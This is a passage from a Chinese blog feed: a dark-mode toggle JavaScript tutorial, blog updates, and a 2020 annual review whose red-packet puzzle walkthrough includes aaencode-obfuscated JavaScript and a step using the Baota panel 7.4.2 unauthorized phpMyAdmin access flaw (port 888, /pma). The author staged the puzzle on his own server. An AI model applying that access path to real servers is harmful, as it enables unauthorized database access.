<code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 